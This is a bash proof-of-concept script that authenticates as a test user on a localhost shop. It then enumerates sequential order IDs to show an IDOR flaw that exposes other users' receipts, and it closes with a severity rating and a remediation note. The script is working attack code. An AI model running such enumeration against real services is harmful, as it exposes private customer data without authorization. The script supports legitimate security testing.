#!/bin/bash

# POC: Insecure Direct Object Reference (IDOR) in Order Receipt Endpoint
# Description: Any authenticated user can access any order receipt by manipulating the order_id parameter
# Target: http://localhost:8082/order/{order_id}/receipt

echo "=========================================="
echo "IDOR POC - Order Receipt Endpoint"
echo "=========================================="
echo ""

TARGET="http://localhost:8082"

# Step 1: Authenticate as user 'test'
echo "[*] Step 1: Authenticating as user 'test' (user_id: 10032)"
AUTH_RESPONSE=$(curl -s -i -X POST "$TARGET/password/test" \
  -d "username=test&user_id=10032&password=test" \
  -c cookies.txt \
  2>&1)

# Extract session cookie
SESSION_COOKIE=$(echo "$AUTH_RESPONSE" | grep -i "Set-Cookie: session=" | sed 's/.*session=\([^;]*\).*/\1/' | head -n 1)

if [ -z "$SESSION_COOKIE" ]; then
  echo "[!] Authentication failed - could not obtain session cookie"
  echo "$AUTH_RESPONSE"
  rm -f cookies.txt
  exit 1
fi

echo "[+] Authentication successful"
echo "[+] Session cookie obtained: session=${SESSION_COOKIE:0:30}..."
echo ""

# Step 2: Get user's legitimate orders
echo "[*] Step 2: Fetching user's legitimate orders from /orders page"
ORDERS_PAGE=$(curl -s "$TARGET/orders" -b "session=$SESSION_COOKIE")

# Extract order IDs from the orders page (look for /order/XXX/receipt links)
USER_ORDERS=$(echo "$ORDERS_PAGE" | grep -oP '/order/\K[0-9]+(?=/receipt)' | sort -u | head -n 4)

if [ -z "$USER_ORDERS" ]; then
  echo "[!] Could not extract user's orders from /orders page"
  # Use known orders from evidence as fallback
  USER_ORDERS="300123 300214 300327 300481"
  echo "[*] Using known orders from evidence: $USER_ORDERS"
fi

echo "[+] User 'test' owns these orders: $USER_ORDERS"
echo ""

# Step 3: Access user's own order receipts (baseline - should work)
echo "[*] Step 3: Accessing user's legitimate order receipts (baseline test)"
FIRST_ORDER=$(echo "$USER_ORDERS" | awk '{print $1}')

RECEIPT_RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$TARGET/order/$FIRST_ORDER/receipt" \
  -b "session=$SESSION_COOKIE")

HTTP_STATUS=$(echo "$RECEIPT_RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
RECEIPT_BODY=$(echo "$RECEIPT_RESPONSE" | sed '/HTTP_STATUS:/d')

if [ "$HTTP_STATUS" = "200" ]; then
  echo "[+] Successfully accessed own order receipt (Order ID: $FIRST_ORDER) - HTTP 200 OK"
  # Check if receipt contains order details
  if echo "$RECEIPT_BODY" | grep -q "Order ID"; then
    ORDER_ID_IN_RECEIPT=$(echo "$RECEIPT_BODY" | grep -oP 'Order ID[:\s]+\K[0-9]+' | head -n 1)
    echo "[+] Receipt contains Order ID: $ORDER_ID_IN_RECEIPT"
  fi
else
  echo "[!] Unexpected status when accessing own order: HTTP $HTTP_STATUS"
fi
echo ""

# Step 4: IDOR Test - Access orders with manipulated IDs
echo "[*] Step 4: IDOR TEST - Attempting to access OTHER order receipts"
echo "[*] Testing sequential order IDs to demonstrate unauthorized access..."
echo ""

# Test a range of order IDs around the known orders
TEST_IDS="300122 300124 300125 300200 300300 300400 300500"

SUCCESSFUL_ACCESS=0
TOTAL_TESTED=0

for ORDER_ID in $TEST_IDS; do
  TOTAL_TESTED=$((TOTAL_TESTED + 1))
  
  IDOR_RESPONSE=$(curl -s -w "\nHTTP_STATUS:%{http_code}" "$TARGET/order/$ORDER_ID/receipt" \
    -b "session=$SESSION_COOKIE")
  
  IDOR_STATUS=$(echo "$IDOR_RESPONSE" | grep "HTTP_STATUS:" | cut -d: -f2)
  IDOR_BODY=$(echo "$IDOR_RESPONSE" | sed '/HTTP_STATUS:/d')
  
  if [ "$IDOR_STATUS" = "200" ]; then
    SUCCESSFUL_ACCESS=$((SUCCESSFUL_ACCESS + 1))
    
    # Check if this order belongs to the user
    IS_USER_ORDER=$(echo "$USER_ORDERS" | grep -w "$ORDER_ID")
    
    if [ -z "$IS_USER_ORDER" ]; then
      echo "[!] VULNERABLE: Successfully accessed Order ID $ORDER_ID - HTTP 200 (NOT user's order)"
      
      # Check if receipt has actual data or is empty
      if echo "$IDOR_BODY" | grep -q "Order ID"; then
        echo "    └─ Receipt contains order data - IDOR CONFIRMED"
      else
        echo "    └─ Receipt template displayed (order may not exist, but endpoint accessible)"
      fi
    else
      echo "[+] Accessed Order ID $ORDER_ID - HTTP 200 (user's own order)"
    fi
  elif [ "$IDOR_STATUS" = "403" ] || [ "$IDOR_STATUS" = "401" ]; then
    echo "[+] Order ID $ORDER_ID - HTTP $IDOR_STATUS (Access Denied - SECURE)"
  else
    echo "[*] Order ID $ORDER_ID - HTTP $IDOR_STATUS"
  fi
done

echo ""
echo "=========================================="
echo "POC RESULTS"
echo "=========================================="
echo "[*] Total order IDs tested: $TOTAL_TESTED"
echo "[*] Successful HTTP 200 responses: $SUCCESSFUL_ACCESS"

if [ $SUCCESSFUL_ACCESS -gt 0 ]; then
  echo ""
  echo "[!] VULNERABILITY CONFIRMED: IDOR in Order Receipt Endpoint"
  echo "[!] Impact: Authenticated users can access ANY order receipt"
  echo "[!] Severity: HIGH - Horizontal Privilege Escalation"
  echo ""
  echo "Expected Behavior: Non-owned orders should return HTTP 403 Forbidden"
  echo "Actual Behavior: All order IDs return HTTP 200, exposing receipt data"
  echo ""
  echo "Recommendation: Implement authorization checks to verify order ownership"
else
  echo "[+] No IDOR vulnerability detected - authorization appears to be working"
fi

# Cleanup
rm -f cookies.txt

echo ""
echo "POC execution completed."